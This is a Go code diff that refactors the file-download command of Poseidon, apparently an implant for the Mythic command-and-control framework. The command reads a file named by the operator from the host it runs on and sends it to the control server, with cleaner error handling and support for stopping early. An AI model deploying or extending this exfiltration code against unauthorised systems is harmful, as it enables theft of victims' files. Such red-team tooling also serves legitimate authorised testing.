@@ -4,35 +4,38 @@ import (
 	// Standard
 	"fmt"
 	"os"
+	"path/filepath"
+	"time"
 
 	// Poseidon
 
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
-//Run - Function that executes the shell command
+// Run - Function that executes the shell command
 func Run(task structs.Task) {
 	//File download
 	path := task.Params
 	// Get the file size first and then the # of chunks required
-	file, err := os.Open(path)
+	fullPath, err := filepath.Abs(path)
 	if err != nil {
-		errResponse := structs.Response{}
-		errResponse.Completed = true
-		errResponse.Status = "error"
-		errResponse.TaskID = task.TaskID
-		errResponse.UserOutput = fmt.Sprintf("Error opening file: %s", err.Error())
-		task.Job.SendResponses <- errResponse
+		msg := task.NewResponse()
+		msg.SetError(fmt.Sprintf("Error opening file: %s", err.Error()))
+		task.Job.SendResponses <- msg
+		return
+	}
+	file, err := os.Open(fullPath)
+	if err != nil {
+		msg := task.NewResponse()
+		msg.SetError(fmt.Sprintf("Error opening file: %s", err.Error()))
+		task.Job.SendResponses <- msg
 		return
 	}
 	fi, err := file.Stat()
 	if err != nil {
-		errResponse := structs.Response{}
-		errResponse.Completed = true
-		errResponse.Status = "error"
-		errResponse.TaskID = task.TaskID
-		errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
-		task.Job.SendResponses <- errResponse
+		msg := task.NewResponse()
+		msg.SetError(fmt.Sprintf("Error getting file size: %s", err.Error()))
+		task.Job.SendResponses <- msg
 		return
 	}
 	downloadMsg := structs.SendFileToMythicStruct{}
@@ -41,19 +44,24 @@ func Run(task structs.Task) {
 	downloadMsg.SendUserStatusUpdates = true
 	downloadMsg.File = file
 	downloadMsg.FileName = fi.Name()
-	downloadMsg.FullPath = path
-	downloadMsg.FinishedTransfer = make(chan int)
+	downloadMsg.FullPath = fullPath
+	downloadMsg.FinishedTransfer = make(chan int, 2)
 	task.Job.SendFileToMythic <- downloadMsg
-	// now block this call until we get confirmation that we're done
-	<-downloadMsg.FinishedTransfer
-	if task.DidStop() {
-
-	} else {
-		finishedMsg := structs.Response{}
-		finishedMsg.Completed = true
-		finishedMsg.UserOutput = "Finished Downloading"
-		finishedMsg.TaskID = task.TaskID
-		task.Job.SendResponses <- finishedMsg
+	for {
+		select {
+		case <-downloadMsg.FinishedTransfer:
+			msg := task.NewResponse()
+			msg.Completed = true
+			msg.UserOutput = "Finished Downloading"
+			task.Job.SendResponses <- msg
+			return
+		case <-time.After(1 * time.Second):
+			if task.DidStop() {
+				msg := task.NewResponse()
+				msg.SetError("Tasked to stop early")
+				task.Job.SendResponses <- msg
+				return
+			}
+		}
 	}
-
 }
